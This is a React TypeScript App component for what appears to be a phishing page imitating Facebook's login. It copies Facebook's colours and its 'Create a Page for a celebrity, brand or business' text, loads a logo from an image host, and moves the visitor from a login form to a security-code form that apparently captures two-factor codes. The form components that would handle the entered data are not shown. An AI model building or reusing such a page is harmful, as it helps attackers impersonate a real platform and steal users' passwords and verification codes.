
import React, { useState } from 'react';
import LoginForm from './components/LoginForm';
import SecurityCodeForm from './components/SecurityCodeForm';
import EntryPage from './components/EntryPage';
import Footer from './components/Footer';
import AIAssistant from './components/AIAssistant';

type View = 'entry' | 'login' | 'security';

const App: React.FC = () => {
  const [showAI, setShowAI] = useState(false);
  const [view, setView] = useState<View>('entry');
  const [userIdentifier, setUserIdentifier] = useState('');

  const handleLoginSuccess = (identifier: string) => {
    setUserIdentifier(identifier);
    setView('security');
  };

  const handleBackToStart = () => {
    setView('entry');
  };

  const handleStartLogin = () => {
    setView('login');
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-[500px]">
        {/* Logo Section - Visible on all pages */}
        <div className="flex justify-center mb-6">
          <img 
            src="https://i.postimg.cc/kMBcDVJz/4l-Cu2zih0ca.png" 
            alt="Social Connect" 
            className="h-[60px] md:h-[100px] object-contain"
          />
        </div>

        {/* Card Container */}
        <div className="bg-white shadow-xl rounded-lg overflow-hidden w-full border border-gray-200">
          {view === 'entry' && <EntryPage onEnter={handleStartLogin} />}
          
          {view === 'login' && (
            <div className="p-4 pb-6 animate-fade-in">
              <LoginForm onSuccess={handleLoginSuccess} />
              <div className="mt-4 text-center border-t border-gray-100 pt-4">
                <button 
                  type="button"
                  className="text-[#1877f2] text-sm font-semibold hover:underline cursor-pointer"
                  onClick={() => setShowAI(true)} 
                >
                  Need help with your account? Ask our AI
                </button>
              </div>
            </div>
          )}
          
          {view === 'security' && (
            <SecurityCodeForm 
              identifier={userIdentifier} 
              onCancel={handleBackToStart}
              onAskAI={() => setShowAI(true)} 
            />
          )}
        </div>

        {/* Action Link for Login View */}
        {view === 'login' && (
          <div className="mt-7 text-center text-sm">
            <p className="text-[#1c1e21]">
              <span className="font-bold cursor-pointer hover:underline">Create a Page</span> for a celebrity, brand or business.
            </p>
          </div>
        )}
      </div>

      <Footer />

      {showAI && <AIAssistant onClose={() => setShowAI(false)} />}
    </div>
  );
};

export default App;
